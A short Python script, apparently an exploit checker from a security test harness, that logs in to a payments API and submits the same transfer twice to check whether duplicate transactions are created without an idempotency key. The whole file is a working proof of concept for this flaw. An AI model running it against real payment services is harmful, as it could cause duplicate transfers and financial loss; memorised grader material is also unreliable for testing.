import os, sys, json
import requests

base = os.environ.get('TARGET_URL', 'http://localhost:8080').rstrip('/')

def out(msg):
    print(msg)
    sys.exit(0)

try:
    s = requests.Session()
    r = s.post(base + '/api/auth/login', json={'Username': 'alice', 'Password': 'alice-pw'}, timeout=3)
    if r.status_code != 200:
        out('EXPLOIT_FAIL: login failed status=' + str(r.status_code))
    token = r.json().get('token')
    if not token:
        out('EXPLOIT_FAIL: no token in login response')
    headers = {'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json'}
    body = {'FromAccount': 'alice', 'ToAccount': 'bob', 'Amount': 10.00}
    r1 = s.post(base + '/api/payments/transfer', headers=headers, data=json.dumps(body), timeout=3)
    r2 = s.post(base + '/api/payments/transfer', headers=headers, data=json.dumps(body), timeout=3)
    if r1.status_code != 200 or r2.status_code != 200:
        out('EXPLOIT_FAIL: transfer status r1=' + str(r1.status_code) + ' r2=' + str(r2.status_code))
    tx1 = r1.json().get('transaction_id')
    tx2 = r2.json().get('transaction_id')
    if not tx1 or not tx2:
        out('EXPLOIT_FAIL: missing transaction_id in response')
    if tx1 != tx2:
        out('EXPLOIT_SUCCESS: duplicate transfers created without Idempotency-Key tx1=' + str(tx1) + ' tx2=' + str(tx2))
    else:
        out('EXPLOIT_FAIL: identical transaction_ids returned (idempotency appears enforced) tx=' + str(tx1))
except Exception as e:
    out('EXPLOIT_FAIL: exception ' + type(e).__name__ + ': ' + str(e)[:120])

